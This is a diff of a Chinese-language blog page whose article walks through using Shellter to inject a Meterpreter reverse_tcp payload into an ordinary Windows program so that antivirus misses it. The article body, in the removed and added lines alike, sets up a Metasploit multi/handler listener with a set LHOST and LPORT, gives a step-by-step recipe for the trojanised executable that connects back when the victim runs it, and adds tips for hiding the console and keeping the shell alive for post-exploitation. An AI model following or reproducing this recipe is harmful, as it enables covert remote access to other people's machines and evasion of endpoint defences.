@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。 笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。">
+    <meta name="description" content="shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Shellter配合MSF进行联动">
 <meta property="og:url" content="http://example.com/2020/10/13/shellter_with_msf/index.html">
 <meta property="og:site_name" content="a1phaboy">
-<meta property="og:description" content="shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。 笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。">
+<meta property="og:description" content="shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2020/10/13/shellter_with_msf/1.jpg">
 <meta property="og:image" content="http://example.com/2020/10/13/shellter_with_msf/2.jpg">
@@ -21,7 +21,7 @@
 <meta property="og:image" content="http://example.com/2020/10/13/shellter_with_msf/8.jpg">
 <meta property="og:image" content="http://example.com/2020/10/13/shellter_with_msf/9.jpg">
 <meta property="article:published_time" content="2020-10-13T12:52:17.000Z">
-<meta property="article:modified_time" content="2020-10-14T04:18:52.371Z">
+<meta property="article:modified_time" content="2020-10-15T02:53:26.837Z">
 <meta property="article:author" content="a1phaboy">
 <meta property="article:tag" content="工具">
 <meta property="article:tag" content="终端安全">
@@ -110,8 +110,7 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/10/13/shellter_with_msf/&title=Shellter配合MSF进行联动"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/10/13/shellter_with_msf/&title=Shellter配合MSF进行联动"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/10/13/shellter_with_msf/&title=Shellter配合MSF进行联动"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/13/shellter_with_msf/&name=Shellter配合MSF进行联动&description=&lt;p&gt;shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。&lt;/p&gt;
-&lt;p&gt;笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/13/shellter_with_msf/&name=Shellter配合MSF进行联动&description=&lt;p&gt;shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。&lt;br&gt;笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/10/13/shellter_with_msf/&t=Shellter配合MSF进行联动"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
@@ -163,25 +162,16 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。</p>
-<p>笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。<a id="more"></a></p>
-<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>首先在官网上下载shellter，笔者这里使用windows平台。下载下来之后双击shellter.exe（以管理员权限打开，以免发生各种奇葩错误）。</p>
-<p><img src="/2020/10/13/shellter_with_msf/1.jpg"></p>
-<p>这里选择 ===&gt; A</p>
-<p><img src="/2020/10/13/shellter_with_msf/2.jpg"></p>
-<p>选择 ===&gt; N 不更新 ， <strong>目标注入程序注意要和shellter放在同一文件夹下</strong> ，然后等待程序寻找可以注入的地方。<br><img src="/2020/10/13/shellter_with_msf/3.jpg"></p>
-<p>选择隐藏模式 ===&gt; Y ，然后选择 ===&gt; L ，选择列表中的payload ，这里我选择 ===&gt;1 与MSF进行联动。<br><img src="/2020/10/13/shellter_with_msf/5.jpg"></p>
-<p>最后一步设置MSF方接收反弹shell的ip和端口号，就完成了。<br><img src="/2020/10/13/shellter_with_msf/6.jpg"></p>
-<p>然后我们来到 MSF ，选择模块，进行ip，端口设置，并进行监听。</p>
-<p><strong><code>use exploit/multi/handler</code></strong></p>
-<p><strong><code>set payload windows/meterpreter/reverse_tcp</code></strong></p>
-<p><strong><code>set LHOST 192.168.160.134</code></strong></p>
-<p><strong><code>set LPORT 8444</code></strong></p>
+    <p>shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。<br>笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。<a id="more"></a></p>
+<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>首先在官网上下载shellter，笔者这里使用windows平台。下载下来之后双击shellter.exe（以管理员权限打开，以免发生各种奇葩错误）。<br><img src="/2020/10/13/shellter_with_msf/1.jpg"><br>这里选择 ===&gt; A<br><img src="/2020/10/13/shellter_with_msf/2.jpg"><br>选择 ===&gt; N 不更新 ， <strong>目标注入程序注意要和shellter放在同一文件夹下</strong> ，然后等待程序寻找可以注入的地方。<br><img src="/2020/10/13/shellter_with_msf/3.jpg"><br>选择隐藏模式 ===&gt; Y ，然后选择 ===&gt; L ，选择列表中的payload ，这里我选择 ===&gt;1 与MSF进行联动。<br><img src="/2020/10/13/shellter_with_msf/5.jpg"><br>最后一步设置MSF方接收反弹shell的ip和端口号，就完成了。<br><img src="/2020/10/13/shellter_with_msf/6.jpg"><br>然后我们来到 MSF ，选择模块，进行ip，端口设置，并进行监听。<br>**<code>&gt; use exploit/multi/handler</code>**</p>
+<p><strong><code>&gt; set payload windows/meterpreter/reverse_tcp</code></strong></p>
+<p><strong><code>&gt; set LHOST 192.168.160.134</code></strong></p>
+<p><strong><code>&gt; set LPORT 8444</code></strong></p>
 <br>
 
 
 <p>双击生成的应用程序（和shellter在同一目录下的）。发现MSF已经上线。<br><img src="/2020/10/13/shellter_with_msf/8.jpg"></p>
-<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p>因为shellter是在正常的应用程序中寻找可以开辟线程存放shellcode的地方，因此，主进程一旦结束，shell也将会终止，因此需要对正常的应用程序做一些手脚，例如隐藏控制台，后台运行等操作来维持shell做后渗透攻击。</p>
+<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p>因为shellter是在正常的应用程序中寻找可以开辟线程存放shellcode的地方，因此，主进程一旦结束，shell也将会终止，因此需要对正常的应用程序做一些手脚，例如隐藏控制台，后台运行等操作来维持shell做后渗透攻击。  </p>
 <p>在C++中，有一句预处理语句： <strong>#pragma comment( linker, “/subsystem:&quot;windows&quot; /entry:&quot;mainCRTStartup&quot;“ )</strong> 可以隐藏控制台，这里我使用sleep使之在后台一直运行来维持shell通信。<br><img src="/2020/10/13/shellter_with_msf/9.jpg"></p>
 <h2 id="高阶玩法"><a href="#高阶玩法" class="headerlink" title="高阶玩法"></a>高阶玩法</h2><p>开始选择 ===》M Manual模式<br>在进行配置会多出几个配置选项</p>
 <p>Gather Dynamic Thread Context Info             ===&gt;收集动态线程上下文信息</p>
@@ -229,8 +219,7 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/10/13/shellter_with_msf/&title=Shellter配合MSF进行联动"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/10/13/shellter_with_msf/&title=Shellter配合MSF进行联动"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/10/13/shellter_with_msf/&title=Shellter配合MSF进行联动"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/13/shellter_with_msf/&name=Shellter配合MSF进行联动&description=&lt;p&gt;shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。&lt;/p&gt;
-&lt;p&gt;笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/13/shellter_with_msf/&name=Shellter配合MSF进行联动&description=&lt;p&gt;shellter是一款动态的shellcode注入工具，可以对正常的应用程序进行shellcode注入，目的在于规避杀软的检测。&lt;br&gt;笔者觉得Shellter比较简单的操作，感觉还是有必要玩一玩。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/10/13/shellter_with_msf/&t=Shellter配合MSF进行联动"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
